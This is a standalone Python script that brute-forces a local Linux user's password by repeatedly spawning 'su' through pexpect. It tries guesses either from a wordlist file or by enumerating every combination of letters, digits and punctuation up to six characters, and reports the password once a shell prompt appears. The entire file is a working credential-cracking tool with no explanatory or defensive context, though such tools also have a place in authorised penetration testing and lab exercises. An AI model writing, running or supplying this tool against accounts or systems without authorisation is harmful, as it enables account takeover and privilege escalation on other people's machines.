import sys
import itertools
import string
import pexpect
from time import sleep

def dictionary(filePath,ratelimit,targetUser):
    
    i = 0
    with open(filePath) as file:
        for line in file:
            guess = line.rstrip()
            child = pexpect.spawn(f'/bin/bash -c "su {targetUser}"')
            child.expect('.*Password:')
            child.sendline(guess)
            sleep(ratelimit)
            index = child.expect(['.*Authentication failure','[#\\$] ']) #index 1 is when getting shell acces
            if index == 0:
                child.close()
                i=i+1
                print(f"checked {i} passwords from wordlist")
            if index == 1:
                print(f"found password on try {i}:{guess}")
                child.close()
                return 0

    return 0

def bruteforce(targetUser,ratelimit):
    i=0
    charlist = string.ascii_letters + string.digits + string.punctuation
    for pwlen in range(1,7):
        for guess in itertools.product(charlist, repeat=pwlen):
            guess = ''.join(guess)
            
            child = pexpect.spawn(f'/bin/bash -c "su {targetUser}"')
            child.expect('.*Password:')
            child.sendline(guess)
            sleep(ratelimit)
            
            index = child.expect(['.*Authentication failure','[#\\$] ']) #index 1 is when getting shell acces
            
            if index == 0:
                child.close()
                i=i+1
                print(f"checked {i} passwords")
        
            if index == 1:
                print(f"found password on try {i}:{guess}")
                child.close()
                return 0
    return 0


def main():
    
    targetUser= sys.argv[1]
    ratelimit=float(sys.argv[2])
    
    if len(sys.argv)==4 :
        filePath=sys.argv[3]
        dictionary(filePath,ratelimit,targetUser)
        return 0
    else:
        bruteforce(targetUser,ratelimit)
        return 0


if __name__ == '__main__':
  main()
